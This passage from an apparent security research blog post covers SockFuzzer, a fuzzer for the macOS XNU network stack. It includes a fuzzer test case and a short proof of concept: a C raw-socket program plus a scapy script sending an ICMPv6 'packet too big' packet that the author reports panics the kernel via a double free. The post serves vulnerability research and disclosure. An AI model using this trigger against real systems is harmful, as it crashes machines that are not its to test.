class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ip6_un1_flow&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ip6_un1_plen&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ip6_un1_nxt&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IPPROTO_ICMPV6&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ip6_un1_hlim&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ip6_src&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IN6_ADDR_LOOPBACK&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ip6_dst&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;IN6_ADDR_ANY&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; tcp_hdr &lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; th_sport&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;PORT_2&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; th_dport&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;PORT_1&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; th_seq&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;SEQ_1&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; th_ack&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;SEQ_1&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; th_off&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; th_win&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; th_sum&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; th_urp&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; is_pure_syn&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;false&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; is_pure_ack&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;false&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; data&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;\377\377\377\377\377\377\377\377\377\377\377\377q\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377\377&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;data_provider&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;This automatically minimized test case requires some human translation to a report that&amp;rsquo;s actionable by developers who don&amp;rsquo;t have access to our fuzzing framework. The test creates a socket and sets some options before delivering a crafted ICMPv6 packet. You can see how the packet grammar we specified comes in handy. I started by transcribing the first three syscall messages directly by writing the following C program.&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c9d8fb90175071c7e24d3ed9cb5e3b8cad7693a3"&gt;&lt;/a&gt;&lt;a id="t.35"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#include&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#define&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;__APPLE_USE_RFC_3542&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#include&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#include&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c17"&gt;#include&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;main&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;fd &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;socket&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;AF_INET6&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;SOCK_RAW&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;IPPROTO_IP&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;fd &lt;/span&gt;&lt;span class="c1"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;failed\n&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;res&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// This is not needed to cause a crash on macOS 10.14.6, but you can&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// try setting this option if you can&amp;#39;t reproduce the issue.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// int space = 1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// res = setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &amp;amp;space, sizeof(space));&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// printf(&amp;quot;res1: %d\n&amp;quot;, res);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;int&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;enable &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; res &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;setsockopt&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;fd&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;IPPROTO_IPV6&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;IPV6_RECVPATHMTU&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;&amp;amp;&lt;/span&gt;&lt;span class="c0"&gt;enable&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;sizeof&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;enable&lt;/span&gt;&lt;span class="c1"&gt;));&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; printf&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;res2: %d\n&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;res&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c17"&gt;// Keep the socket open without terminating.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;while&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;1&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sleep&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c3"&gt;5&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; close&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;fd&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c6"&gt;return&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c3"&gt;0&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c1"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;With the socket open, it&amp;rsquo;s now a matter of sending a special ICMPv6 packet to trigger the bug. Using the original crash as a guide, I reviewed the code around the crashing instruction to understand which parts of the input were relevant. I discovered that sending a &amp;ldquo;packet too big&amp;rdquo; notification would reach the buggy code, so I used the &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://scapy.net/"&gt;scapy&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;library for Python to send the buggy packet locally. My kernel panicked, confirming the double free vulnerability.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5835bc8393a6afa2b0624af9b70d27f9f4b58fd4"&gt;&lt;/a&gt;&lt;a id="t.36"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;from&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;scapy&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;all &lt;/span&gt;&lt;span class="c6"&gt;import&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;sr1&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;IPv6&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;ICMPv6PacketTooBig&lt;/span&gt;&lt;span class="c1"&gt;,&lt;/span&gt;&lt;span class="c0 c2"&gt;&amp;nbsp;raw&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;outer &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;IPv6&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;dst&lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;::1&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c13"&gt;ICMPv6PacketTooBig&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;/&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c19"&gt;&amp;quot;\x41&amp;quot;&lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c3"&gt;40&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c15"&gt;&lt;span class="c0 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;print&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;raw&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;outer&lt;/span&gt;&lt;span class="c1"&gt;).&lt;/span&gt;&lt;span class="c0"&gt;hex&lt;/span&gt;&lt;span class="c1"&gt;())&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;p &lt;/span&gt;&lt;span class="c1"&gt;=&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;sr1&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c0"&gt;outer&lt;/span&gt;&lt;span class="c1"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;if&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;p&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; p&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;span class="c0"&gt;show&lt;/span&gt;&lt;span class="c1"&gt;()&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;Creating a working PoC from the crashing protobuf input took about an hour, thanks to the straightforward mapping from grammar to syscalls/network input and the utility of being able to debug the local crashing &amp;ldquo;kernel&amp;rdquo; using gdb.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.3b7k7e45aqfc"&gt;&lt;span class="c7 c2"&gt;Drawbacks&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Any fuzzing project of this size will require design decisions that have some tradeoffs. The most obvious issue is the inability to detect race conditions. Threading bugs can be found with fuzzing but are still best left to static analysis and manual review as fuzzers can&amp;rsquo;t currently deal with the state space of interleaving threads. Maybe this will change in the future, but today it&amp;rsquo;s an issue. I accepted this problem and removed threading completely from the fuzzer; some bugs were missed by this, such as a race condition &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://youtu.be/8cOx7vfszZU?t=366"&gt;in the bind syscall&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Another issue lies in the fact that by replacing so much functionality by hand, it&amp;rsquo;s hard to extend the fuzzer trivially to support additional attack surfaces. This is evidenced by another issue I missed in &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://twitter.com/WangTielei/status/1246376070367965184"&gt;packet filtering&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;. I don&amp;rsquo;t support VFS at the moment, so I can&amp;rsquo;t access the bpf device. A syzkaller-like project would have less trouble with supporting this code since VFS would already be working. I made an explicit decision to build a simple tool that works very effectively and meticulously, but this can mean missing some low hanging fruit due to the effort involved.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Per-test case determinism is an issue that I&amp;rsquo;ve solved only partially. If test cases aren&amp;rsquo;t deterministic, libFuzzer becomes less efficient as it thinks some tests are finding new coverage when they really depend on one that was run previously. To mitigate this problem, I track open file descriptors manually and run all of the garbage collection thread functions after each test case. Unfortunately, there are many ioctls that change state in the background. It&amp;rsquo;s hard to keep track of them to clean up properly but they are important enough that it&amp;rsquo;s not worth disabling them just to improve determinism. If I were working on a long-term well-resourced overhaul of the XNU network stack, I would probably make sure there&amp;rsquo;s a way to cleanly tear down the whole stack to prevent this problem.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Perhaps the largest caveat of this project is its reliance on source code. Without the efficiency and productivity losses that come with binary-only research, I can study the problem more closely to the source. But I humbly admit that this approach ignores many targets and doesn&amp;rsquo;t necessarily match real attackers&amp;rsquo; workflows. Real attackers take the shortest path they can to find an exploitable vulnerability, and often that path is through bugs found via binary-based fuzzing or reverse engineering and auditing. I intend to discover some of the best practices for fuzzing with the source and then migrate this approach to work with binaries. &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://github.com/googleprojectzero/TinyInst"&gt;Binary instrumentation&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;can assist in coverage guided fuzzing, but some of my tricks around substituting fake implementations or changing behavior to be more fuzz-friendly is a more significant burden when working with binaries. But I believe these are tractable problems, and I expect researchers can adapt some of these techniques to binary-only fuzzing efforts, even if there is additional overhead.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.vb3z86pd31px"&gt;&lt;span class="c7 c2"&gt;Open Sourcing and Future Work&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;This fuzzer is now open source on &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://github.com/googleprojectzero/SockFuzzer"&gt;GitHub&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;. I invite you to study the code and improve it! I&amp;rsquo;d like to continue the development of this fuzzer semi-publicly. Some modifications that yield new vulnerabilities may need to be embargoed until relevant patches go out. Still, I hope that I can be as transparent as possible in my research. By working publicly, it may be possible to bring the original XNU project and this fuzzer closer together by sharing the efforts. I&amp;rsquo;m hoping the upstream developers can make use of this project to perform their own testing and perhaps make their own improvements to XNU to make this type of testing more accessible. There&amp;rsquo;s plenty of remaining work to improve the existing grammar, add support for new subsystems, and deal with some high-level design improvements such as adding proper threading support.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;An interesting property of the current fuzzer is that despite reaching coverage saturation on ClusterFuzz after many months, there is still reachable but uncovered code due to the enormous search space. This means that improvements in coverage-guided fuzzing could find new bugs. I&amp;rsquo;d like to encourage teams who perform fuzzing engine research to use this project as a baseline. If you find a bug, you can take the credit for it! I simply hope you share your improvements with me and the rest of the community.&lt;/span&gt;&lt;/p&gt; &lt;p class="c18 c23 c25 title" id="h.n705fp4we09t"&gt;&lt;span class="c7 c2"&gt;Conclusion&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span&gt;Modern kernel development has some catching up to do. XNU and Linux suffer from some process failures that lead to &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://www.synacktiv.com/en/publications/return-of-the-ios-sandbox-escape-lightspeeds-back-in-the-race.html"&gt;shipping&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://www.theguardian.com/technology/2019/aug/20/apple-reopens-security-flaw-ios-iphone"&gt;security&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=c6c9fee35dc27362b7bac34b2fc9f5b8ace2e22c"&gt;regressions&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Kernels, perhaps the most security-critical component of operating systems, are becoming increasingly fragile as memory corruption issues become easier to discover. Implementing better mitigations is half the battle; we need better kernel unit testing to make identifying and fixing (even non-security) &lt;/span&gt;&lt;span&gt;bugs &lt;/span&gt;&lt;span class="c8 c2"&gt;cheaper.&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4 c18"&gt;&lt;span class="c8 c2"&gt;Since my last post, Apple has increased the frequency of its open-source releases. This is great for end-user security. The more publicly that Apple can develop XNU, the more that external contributors like myself may have a chance to contribute 